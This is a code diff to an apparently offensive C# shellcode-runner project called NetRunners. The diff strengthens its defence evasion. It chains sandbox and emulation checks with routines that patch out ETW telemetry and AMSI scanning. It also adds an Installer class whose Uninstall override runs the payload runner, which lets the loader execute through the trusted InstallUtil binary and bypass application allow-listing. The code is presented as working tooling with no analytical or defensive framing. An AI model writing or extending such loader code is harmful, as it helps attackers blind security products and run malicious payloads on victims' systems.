@@ -23,13 +23,10 @@ namespace NetRunners.Exe
                 return;
             }
             // call heuristic functions
-            if ((!Sleep()) || (!NonEmulated()))
+            if ((!Sleep()) || (!NonEmulated()) || (!PatchEtw()) || (!PatchAmsi()))
             {
                 return;
             }
-            // call patchers
-            if ((!PatchEtw()) || (!PatchAmsi()))
-                return;
 
             // Determine the function call based on the argument provided, case insensitive
             string call = args.Length == 1 ? args[0] : string.Empty;
@@ -51,6 +48,24 @@ namespace NetRunners.Exe
                     Runners.Runner.Run();
                     break;
             }     
+        }
+    }
+    /// <summary>
+    /// Add InstallUtil support.
+    /// </summary>
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            // call heuristic functions
+            if ((!Sleep()) || (!NonEmulated()) || (!PatchEtw()) || (!PatchAmsi()))
+                return;
+
+            Runners.EpsRunner.Run();
+            //Runners.PiRunner.Run();
+            //Runners.Runner.Run();
+
         }
     }
 }
